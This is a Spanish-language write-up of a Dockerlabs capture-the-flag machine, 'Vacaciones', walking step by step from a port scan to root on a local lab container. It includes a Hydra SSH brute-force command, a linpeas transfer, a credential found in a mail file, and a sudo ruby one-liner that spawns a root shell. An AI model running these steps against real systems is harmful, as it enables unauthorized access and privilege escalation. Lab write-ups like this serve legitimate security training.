# Maquina-Vacaciones

## Resolución de la Maquina Vacaciones de Dockerlabs.es "El pinguino de Mario"

## Paso N°1: Busqueda con nmap.

```bash
nmap -sV 172.17.0.2
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-23 08:31 -03
Nmap scan report for 172.17.0.2
Host is up (0.000093s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.18 seconds
```
_Adjunto imagen:_

![01](https://github.com/EzeTauil/Maquina-Vacaciones/assets/118028611/981f38e1-a867-425c-a015-96e8f0f3a69d)

#################################################################################################

## Paso N°2: Busqueda con Nikto.

```bash
nikto -h http://172.17.0.2             
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          172.17.0.2
+ Target Hostname:    172.17.0.2
+ Target Port:        80
+ Start Time:         2024-06-23 08:44:45 (GMT-3)
---------------------------------------------------------------------------
+ Server: Apache/2.4.29 (Ubuntu)
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Apache/2.4.29 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ /: Server may leak inodes via ETags, header found with file /, inode: 4a, size: 616e75cb6bc40, mtime: gzip. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418
+ OPTIONS: Allowed HTTP Methods: POST, OPTIONS, HEAD, GET .
+ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/
+ 8102 requests: 0 error(s) and 6 item(s) reported on remote host
+ End Time:           2024-06-23 08:45:16 (GMT-3) (31 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```
_Adjunto imagen:_ 

![02](https://github.com/EzeTauil/Maquina-Vacaciones/assets/118028611/5b6f778c-e799-4bd3-a45c-c99822d1e4f4)

#################################################################################################

## Paso N°3: Busqueda con dirb.

```bash
dirb http://172.17.0.2 

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sun Jun 23 08:48:23 2024
URL_BASE: http://172.17.0.2/
WORDLIST_FILES: /usr/share/wordlists/dirb/common.txt
-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://172.17.0.2/ ----
+ http://172.17.0.2/index.html (CODE:200|SIZE:74)
==> DIRECTORY: http://172.17.0.2/javascript/                                                           
+ http://172.17.0.2/server-status (CODE:403|SIZE:275)
                                         
---- Entering directory: http://172.17.0.2/javascript/ ----
==> DIRECTORY: http://172.17.0.2/javascript/jquery/                                                    
                                                                                                       
---- Entering directory: http://172.17.0.2/javascript/jquery/ ----
+ http://172.17.0.2/javascript/jquery/jquery (CODE:200|SIZE:268026)                                                                                                   
-----------------
END_TIME: Sun Jun 23 08:48:25 2024
DOWNLOADED: 13836 - FOUND: 3
```
_Adjunto imagen:_ 

![03](https://github.com/EzeTauil/Maquina-Vacaciones/assets/118028611/0adff950-b91c-4554-836f-d9313aefe3c6)

_Aca podemos ver 3 directorios, dos de ellos nos envia  a paginas que no funcionan y una la "index.html" que NO muestra nada pero si le damos a inspeccionar vemos un mensaje que dice: "De: Juan Para: Camilo, te he dejado un correo es importante"_

_Adjunto imagen:_ 

![05](https://github.com/EzeTauil/Maquina-Vacaciones/assets/118028611/6ea184f0-a4cc-41b8-b071-366cac35a497)

_#################################################################_
-----------------------------------------------------------------------------------------

![06](https://github.com/EzeTauil/Maquina-Vacaciones/assets/118028611/0c4c2b80-f609-4d4d-a030-a40b482cd97b)

_#################################################################_
-----------------------------------------------------------------------------------------
![07](https://github.com/EzeTauil/Maquina-Vacaciones/assets/118028611/e3b537f8-0bd7-460b-a5f2-4df80340db54)

_Como sabemos que tiene el "puerto 22" abierto que es el de ssh vamos a probar con el nombre de camilo y si no funciona probamos con el de juan._

## Paso N°4: Ataque de Fuerza Bruta con Hydra.

_Asi que ahora procedemos a usar hydra de la siguiente manera:_ 

```bash
hydra  -l camilo -P /usr/share/wordlists/rockyou.txt -t4 -vV 172.17.0.2 ssh
```
_Adjunto imagen:_

![11](https://github.com/EzeTauil/Maquina-Vacaciones/assets/118028611/d86dc60b-e2dd-4a05-a60c-8211afe393aa)

_#################################################################_
-----------------------------------------------------------------------------------------
![12](https://github.com/EzeTauil/Maquina-Vacaciones/assets/118028611/06ecceee-10b7-4f7e-ab41-f0a3309575ab)

_Encontramos la contraseña de camilo que es "password1" , asi que procedemos a la conexion por ssh._

## Paso N°5: Conexion por SSH.

_Ponemos el siguiente comando:_

```bash
ssh camilo@172.17.0.2
```
_Adjunto imagen:_ 

![13](https://github.com/EzeTauil/Maquina-Vacaciones/assets/118028611/f0a35458-b2a0-4fd2-84f5-50f224815517)

_Una vez estamos dentro comprobamos con un "whoami" y vemos que nos muestra el nombre "camilo", realizamos algunas pruebas más ponemos "sudo -l" la salida que obtenemos es: "Sorry, user camilo may not run sudo on 8390902f87ea._

## Paso N°6: Uso de la herramienta Linpeas.

_En éste caso voy a usar "linpeas" para ver si encuentra algo más, asi que voy a pasarlo a la maquina victima por ssh usando el usuario "camilo" y lo hago de la siguiente manera:_

```bash
scp linpeas.sh camilo@172.17.0.2:/tmp/
```
_Adjunto imagen:_ 

![17](https://github.com/EzeTauil/Maquina-Vacaciones/assets/118028611/cd67e050-67a6-45b5-8204-11d6acd467ae)


_Ahora le damos permisos con "chmod +x /tmp/linpeas.sh" y lo ejecutamos:_ 

```bash
chmod +x /tmp/linpeas.sh
/tmp/linpeas.sh
```
_Adjunto imagen:_ 

![23](https://github.com/EzeTauil/Maquina-Vacaciones/assets/118028611/85054383-814c-4e22-9354-9319f9243627)

 _Pasamos a buscar algun archivo relacionado con el mensaje de juan y el correo que le mando a camilo y encontramos lo que buscabamos! podemos ver una ruta que dice:" /var/mail/camilo/correo.txt y la otra /var/spool/mail/camilo/correo", asi que vamos a buscar en la primer ruta._
 
_Adjunto imagen:_  
 
![18](https://github.com/EzeTauil/Maquina-Vacaciones/assets/118028611/0cb01e39-5590-4fb2-b631-61ca94fbff20)

## Paso N°7: Buscamos informacion en la ruta encontrada.

_Ponemos: "cat /var/mail/camilo/correo.txt" y podemos ver el mensaje que le envio juan a camilo y dice lo siguiente : "Hola Camilo, me voy de vacaciones y no he terminado el trabajo que me dio el jefe. Por si acaso lo pide, aqui tienes la contraseña: 2k84dicb."_

```bash
cat /var/mail/camilo/correo.txt
Hola Camilo,
Me voy de vacaciones y no he terminado el trabajo que me dio el jefe. Por si acaso lo pide, aqui tienes la contraseña: 2k84dicb.
```
_Adjunto imagen:_ 

![19](https://github.com/EzeTauil/Maquina-Vacaciones/assets/118028611/4e4513c8-556b-4d1f-9434-b8c0eafd0f85)

_Ahora que tenemos una contraseña podemos suponer que se trata de la calve para conectarse por ssh con su usuario y ya que camilo no es usuario root vamos a ver si juan lo es o si podemos de alguna manera acceder como root con el usuario de juan._

## Paso N°8: Nueva conexion por SSH con el usuario Juan y Escalada de Privilegios.

_Pasamos a ver si nos podemos conectar por ssh con el usuario juan y usando la contraseña "2k84dicb" que dejo._

```bash
ssh juan@172.17.0.2
password: 2k84dicb
```
_Adjunto imagen:_ 

![20](https://github.com/EzeTauil/Maquina-Vacaciones/assets/118028611/d878d00a-25bd-4616-ae01-09b910d387c5)

_Logramos tener acceso! hacemos un "whoami"_
_Salida: juan_
_ponemos "sudo -l "
y vemos que nos dice user juan may run the following commands on8390902f87ea:
(ALL) NOPASSWD: /usr/bin/ruby_

_Adjunto imagen:_ 

![24](https://github.com/EzeTauil/Maquina-Vacaciones/assets/118028611/61204189-229a-4e87-99f2-8e5f12016237)

_Esto significa que el usuario juan puede ejecutar el comando /usr/bin/ruby con privilegios de root sin necesidad de proporcionar una contraseña._

_Asi que si ponemos "sudo /usr/bin/ruby -e 'exec "/bin/bash' vamos a obtener una shell con privilegios root_

_Adjunto imagen:_ 

![22](https://github.com/EzeTauil/Maquina-Vacaciones/assets/118028611/9ad56062-387c-48ab-a357-c1d250159541)
## ¡Finalmente conseguimos el acceso "ROOT"!



















